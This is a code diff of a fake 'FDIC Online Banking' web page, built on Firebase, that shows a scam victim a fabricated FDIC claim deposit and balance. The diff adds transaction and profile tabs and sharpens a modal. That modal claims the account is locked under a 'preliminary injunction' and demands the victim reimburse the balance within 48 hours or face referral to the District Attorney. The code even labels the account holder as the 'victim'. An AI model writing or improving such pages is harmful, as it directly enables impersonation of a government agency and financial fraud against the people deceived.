@@ -3,148 +3,186 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FDIC Online Banking | Dashboard</title>
+  <title>FDIC Online Banking</title>
   <style>
     :root {
       --fdic-blue: #003366;
       --fdic-light-blue: #00509e;
       --fdic-gray: #f4f6f8;
       --text-dark: #333;
+      --text-light: #666;
       --white: #ffffff;
-      --border: #d1d5db;
+      --border: #e0e0e0;
       --success-green: #28a745;
-      --alert-red: #d9534f;
+      --alert-red: #c0392b;
+      --shadow: 0 2px 10px rgba(0,0,0,0.08);
     }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background: var(--fdic-gray); color: var(--text-dark); min-height: 100vh; padding-bottom: 80px; }
+    body { background: var(--fdic-gray); color: var(--text-dark); padding-bottom: 70px; min-height: 100vh; }
     
     /* Header */
-    .header { background: var(--fdic-blue); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
-    .header h2 { font-size: 18px; font-weight: 600; }
-    .user-info { font-size: 13px; display: flex; align-items: center; gap: 15px; }
-    .user-info a { color: white; text-decoration: none; cursor: pointer; }
-    
+    .header { 
+      background: var(--fdic-blue); 
+      color: white; 
+      padding: 20px; 
+      display: flex; 
+      align-items: center; 
+      justify-content: space-between;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    .brand { display: flex; align-items: center; gap: 15px; }
+    .logo-text { font-size: 28px; font-weight: 800; letter-spacing: 1px; }
+    .slogan { 
+      font-size: 10px; 
+      font-weight: 400; 
+      opacity: 0.9; 
+      line-height: 1.2; 
+      max-width: 120px; 
+      text-transform: uppercase; 
+    }
+    .user-actions { font-size: 14px; }
+    .logout-btn { color: white; cursor: pointer; text-decoration: underline; }
+
     /* Main Container */
     .container { max-width: 600px; margin: 0 auto; padding: 20px; }
 
-    /* Account Card */
-    .account-card { background: var(--white); border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
-    .account-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
-    .account-title h3 { font-size: 16px; color: #666; font-weight: 500; }
-    .account-title h2 { font-size: 20px; color: var(--text-dark); font-weight: 700; }
-    .account-number { font-size: 13px; color: #888; font-family: monospace; }
+    /* Cards */
+    .card { background: var(--white); border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: var(--shadow); }
     
-    .balance-section { margin: 20px 0; }
-    .balance-label { font-size: 13px; color: #666; margin-bottom: 5px; }
-    .balance-amount { font-size: 32px; font-weight: 700; color: var(--fdic-blue); }
+    /* Account Info */
+    .account-title { font-size: 14px; color: var(--text-light); font-weight: 500; margin-bottom: 5px; }
+    .account-holder { font-size: 22px; font-weight: 700; color: var(--text-dark); margin-bottom: 15px; }
+    .account-number { font-size: 13px; color: #888; font-family: monospace; margin-bottom: 20px; display: block; }
+    
+    .balance-label { font-size: 13px; color: var(--text-light); margin-bottom: 5px; }
+    .balance-amount { font-size: 36px; font-weight: 800; color: var(--fdic-blue); margin-bottom: 25px; }
     
     /* Action Buttons */
-    .actions-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+    .actions-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
     .action-btn { 
       background: var(--fdic-light-blue); 
       color: white; 
       border: none; 
-      padding: 15px 10px; 
-      border-radius: 6px; 
+      padding: 18px 10px; 
+      border-radius: 8px; 
       font-size: 13px; 
       font-weight: 600; 
       cursor: pointer; 
       text-align: center;
-      transition: background 0.2s;
+      transition: transform 0.1s, background 0.2s;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
+    .action-btn:active { transform: scale(0.98); }
     .action-btn:hover { background: var(--fdic-blue); }
-    .action-btn span { display: block; font-size: 18px; margin-bottom: 5px; }
+    .action-icon { font-size: 20px; }
 
     /* Transaction History */
-    .transactions-card { background: var(--white); border-radius: 10px; padding: 20px; margin-top: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
-    .trans-header { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: var(--text-dark); border-bottom: 1px solid #eee; padding-bottom: 10px; }
-    
-    .trans-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
+    .section-header { font-size: 18px; font-weight: 600; margin-bottom: 15px; color: var(--text-dark); }
+    .trans-item { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); }
     .trans-item:last-child { border-bottom: none; }
     .trans-info { flex: 1; }
-    .trans-desc { font-size: 14px; font-weight: 500; color: var(--text-dark); margin-bottom: 3px; }
+    .trans-desc { font-size: 14px; font-weight: 500; color: var(--text-dark); margin-bottom: 4px; }
     .trans-meta { font-size: 12px; color: #888; }
     .trans-amount { font-size: 14px; font-weight: 700; color: var(--success-green); text-align: right; }
-    .trans-status { font-size: 10px; background: #e6f4ea; color: var(--success-green); padding: 2px 6px; border-radius: 4px; margin-left: 8px; }
+    .trans-status { font-size: 10px; background: #e6f4ea; color: var(--success-green); padding: 3px 8px; border-radius: 12px; margin-top: 5px; display: inline-block; }
 
-    /* Modal/Popup */
+    /* Profile Section */
+    .profile-item { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-size: 14px; }
+    .profile-label { color: var(--text-light); }
+    .profile-value { font-weight: 600; color: var(--text-dark); }
+
+    /* Bottom Navigation */
+    .bottom-nav {
+      position: fixed; bottom: 0; left: 0; width: 100%;
+      background: white;
+      border-top: 1px solid var(--border);
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0;
+      z-index: 99;
+    }
+    .nav-item {
+      display: flex; flex-direction: column; align-items: center;
+      color: #888; font-size: 11px; cursor: pointer;
+      background: none; border: none;
+    }
+    .nav-item.active { color: var(--fdic-blue); font-weight: 600; }
+    .nav-icon { font-size: 22px; margin-bottom: 3px; }
+
+    /* Modal */
     .modal-overlay {
-      display: none;
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.5);
-      z-index: 1000;
-      justify-content: center;
-      align-items: center;
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); z-index: 1000;
+      justify-content: center; align-items: center;
+      backdrop-filter: blur(2px);
     }
     .modal-overlay.active { display: flex; }
     .modal-content {
-      background: white;
-      padding: 25px;
-      border-radius: 8px;
-      max-width: 90%;
-      width: 400px;
-      text-align: center;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      background: white; padding: 30px; border-radius: 10px;
+      max-width: 90%; width: 400px; text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      border-top: 5px solid var(--alert-red);
     }
-    .modal-title { font-size: 18px; font-weight: 700; color: var(--alert-red); margin-bottom: 15px; text-transform: uppercase; }
-    .modal-body { font-size: 14px; color: #333; line-height: 1.5; margin-bottom: 20px; text-align: left; }
+    .modal-title { font-size: 18px; font-weight: 700; color: var(--alert-red); margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+    .modal-body { font-size: 14px; color: #444; line-height: 1.6; margin-bottom: 25px; text-align: left; }
     .modal-body strong { color: var(--fdic-blue); }
     .modal-close {
-      background: var(--fdic-blue); color: white; border: none; padding: 10px 20px;
-      border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 600;
+      background: var(--fdic-blue); color: white; border: none; padding: 12px 25px;
+      border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 600;
+      width: 100%;
     }
+    .modal-close:hover { background: var(--fdic-light-blue); }
 
-    .loading { text-align: center; padding: 40px; color: #666; }
+    .loading { text-align: center; padding: 50px; color: #888; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
 
+  <!-- Header -->
   <div class="header">
-    <h2>FDIC Online Banking</h2>
-    <div class="user-info">
-      <span id="userNameDisplay">Welcome, User</span>
-      <a id="logoutBtn">Sign Out</a>
+    <div class="brand">
+      <div class="logo-text">FDIC</div>
+      <div class="slogan">Backed by the full faith and credit of the United States government.</div>
+    </div>
+    <div class="user-actions">
+      <span id="userNameHeader" style="margin-right: 15px; font-weight: 500;"></span>
+      <span class="logout-btn" id="logoutBtn">Sign Out</span>
     </div>
   </div>
 
   <div class="container">
-    <div id="loadingMsg" class="loading">Loading your account...</div>
+    <div id="loadingMsg" class="loading">Loading account details...</div>
 
-    <!-- Main Content (Hidden until loaded) -->
-    <div id="mainContent" style="display:none;">
-      
-      <!-- Account Summary -->
-      <div class="account-card">
-        <div class="account-header">
-          <div class="account-title">
-            <h3 id="accountType">CHECKING</h3>
-            <h2 id="victimNameDisplay">Victim Name</h2>
-            <div class="account-number" id="accountNumber">---1234</div>
-          </div>
-        </div>
+    <!-- Dashboard Tab Content -->
+    <div id="tab-dashboard" class="tab-content">
+      <div class="card">
+        <div class="account-title">PRIMARY CHECKING</div>
+        <div class="account-holder" id="victimNameDisplay">Victim Name</div>
+        <span class="account-number" id="accountNumber">---1234</span>
         
-        <div class="balance-section">
-          <div class="balance-label">Available Balance</div>
-          <div class="balance-amount" id="balanceDisplay">$0.00</div>
-        </div>
+        <div class="balance-label">Available Balance</div>
+        <div class="balance-amount" id="balanceDisplay">$0.00</div>
 
         <div class="actions-grid">
           <button class="action-btn" onclick="showRestrictedModal()">
-            <span>⇄</span>Transfer Funds
+            <span class="action-icon">⇄</span> Transfer Funds
           </button>
           <button class="action-btn" onclick="showRestrictedModal()">
-            <span>+</span>Deposit
+            <span class="action-icon">+</span> Deposit
           </button>
           <button class="action-btn" onclick="showRestrictedModal()">
-            <span>📄</span>Pay Bills
+            <span class="action-icon">📄</span> Pay Bills
           </button>
         </div>
       </div>
 
-      <!-- Transaction History -->
-      <div class="transactions-card">
-        <div class="trans-header">Recent Activity</div>
-        
+      <div class="card">
+        <div class="section-header">Recent Activity</div>
         <div class="trans-item">
           <div class="trans-info">
             <div class="trans-desc">FDIC CLAIM PAYMENT REF:8821-4490</div>
@@ -158,6 +196,73 @@
         </div>
       </div>
     </div>
+
+    <!-- Transactions Tab Content -->
+    <div id="tab-transactions" class="tab-content hidden">
+      <div class="card">
+        <div class="section-header">Full Transaction History</div>
+        <div class="trans-item">
+          <div class="trans-info">
+            <div class="trans-desc">FDIC CLAIM PAYMENT REF:8821-4490</div>
+            <div class="trans-meta" id="transDateFull">07/23/2026 09:14:22 AM EST</div>
+            <div class="trans-meta">ID: FDIC-CLM-20260723-99841</div>
+            <div class="trans-meta">Sender: FEDERAL DEPOSIT INSURANCE CORP</div>
+            <div class="trans-meta">Reference: ACCT-SETTLEMENT</div>
+          </div>
+          <div style="text-align: right;">
+            <div class="trans-amount" id="transAmountFull">+$4,250.00</div>
+            <div class="trans-status">POSTED</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Profile Tab Content -->
+    <div id="tab-profile" class="tab-content hidden">
+      <div class="card">
+        <div class="section-header">Account Details</div>
+        <div class="profile-item">
+          <span class="profile-label">Account Holder</span>
+          <span class="profile-value" id="profileName">Name</span>
+        </div>
+        <div class="profile-item">
+          <span class="profile-label">Account Number</span>
+          <span class="profile-value" id="profileAcctNum">---1234</span>
+        </div>
+        <div class="profile-item">
+          <span class="profile-label">Account Type</span>
+          <span class="profile-value" id="profileType">CHECKING</span>
+        </div>
+        <div class="profile-item">
+          <span class="profile-label">Email</span>
+          <span class="profile-value" id="profileEmail">email@example.com</span>
+        </div>
+        <div class="profile-item">
+          <span class="profile-label">Phone</span>
+          <span class="profile-value" id="profilePhone">555-0199</span>
+        </div>
+        <div class="profile-item">
+          <span class="profile-label">Address</span>
+          <span class="profile-value" id="profileAddress">123 Main St</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bottom Navigation -->
+  <div class="bottom-nav">
+    <button class="nav-item active" onclick="switchTab('dashboard')">
+      <span class="nav-icon">🏠</span>
+      Dashboard
+    </button>
+    <button class="nav-item" onclick="switchTab('transactions')">
+      <span class="nav-icon">📋</span>
+      Transactions
+    </button>
+    <button class="nav-item" onclick="switchTab('profile')">
+      <span class="nav-icon">👤</span>
+      Profile
+    </button>
   </div>
 
   <!-- Restricted Modal -->
@@ -166,9 +271,9 @@
       <div class="modal-title">ACCOUNT RESTRICTED</div>
       <div class="modal-body">
         <strong>PRELIMINARY INJUNCTION</strong><br><br>
-        Transfer, withdrawal, and deposit functions are <strong>LOCKED</strong>.<br><br>
-        <strong>Action Required:</strong> Reimburse the compromised balance to lift the hold.<br><br>
-        <strong>Notice:</strong> Failure to remit payment will result in immediate referral to the local District Attorney for legal action.
+        Transfer, withdrawal, and deposit functions are currently <strong>LOCKED</strong> due to a pending claim review.<br><br>
+        <strong>Action Required:</strong> Reimburse the compromised balance to lift the hold and restore full access.<br><br>
+        <strong>Notice:</strong> Failure to remit payment within 48 hours will result in immediate referral to the local District Attorney for legal action.
       </div>
       <button class="modal-close" onclick="closeRestrictedModal()">Close Notice</button>
     </div>
@@ -191,6 +296,18 @@
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getDatabase(app);
+
+    // Tab Switching Logic
+    window.switchTab = (tabName) => {
+      // Hide all tabs
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+      // Show selected tab
+      document.getElementById(`tab-${tabName}`).classList.remove('hidden');
+      
+      // Update Nav Icons
+      document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+      event.currentTarget.classList.add('active');
+    };
 
     // Modal Functions
     window.showRestrictedModal = () => {
@@ -216,47 +333,45 @@
           
           if (data) {
             document.getElementById('loadingMsg').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('userNameHeader').textContent = data.name;
             
-            // Update Header
-            document.getElementById('userNameDisplay').textContent = data.name;
-            
-            // Update Account Info
+            // Dashboard Data
             document.getElementById('victimNameDisplay').textContent = data.name;
-            document.getElementById('accountType').textContent = data.type ? data.type.toUpperCase() : 'CHECKING';
             document.getElementById('accountNumber').textContent = `---${data.last4 || '1234'}`;
+            document.getElementById('profileName').textContent = data.name;
+            document.getElementById('profileAcctNum').textContent = `---${data.last4 || '1234'}`;
+            document.getElementById('profileType').textContent = data.type ? data.type.toUpperCase() : 'CHECKING';
+            document.getElementById('profileEmail').textContent = user.email;
+            document.getElementById('profilePhone').textContent = data.phone || '---';
+            document.getElementById('profileAddress').textContent = data.address || '---';
             
-            // Format Balance
             const balanceVal = parseFloat(data.balance || 0);
-            document.getElementById('balanceDisplay').textContent = `$${balanceVal.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            const formattedBalance = `$${balanceVal.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
             
-            // Format Transaction Amount (Matches Balance)
-            document.getElementById('transAmount').textContent = `+$${balanceVal.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+            document.getElementById('balanceDisplay').textContent = formattedBalance;
+            document.getElementById('transAmount').textContent = `+${formattedBalance}`;
+            document.getElementById('transAmountFull').textContent = `+${formattedBalance}`;
             
-            // Format Transaction Date (Uses createdAt timestamp)
+            // Format Date
             let transDateStr = "07/23/2026 09:14:22 AM EST";
             if (data.createdAt) {
               const date = new Date(data.createdAt);
               transDateStr = date.toLocaleString('en-US', {
-                month: '2-digit',
-                day: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: true,
-                timeZone: 'America/New_York'
+                month: '2-digit', day: '2-digit', year: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit',
+                hour12: true, timeZone: 'America/New_York'
               }) + " EST";
             }
             document.getElementById('transDate').textContent = transDateStr;
+            document.getElementById('transDateFull').textContent = transDateStr;
 
           } else {
-            alert("Account not found.");
+            alert("Account data missing.");
             signOut(auth);
           }
         } catch (error) {
           console.error("Error loading data:", error);
-          document.getElementById('loadingMsg').textContent = "Error loading account. Check console.";
+          document.getElementById('loadingMsg').textContent = "Error loading account.";
         }
       } else {
         window.location.href = "index.html";
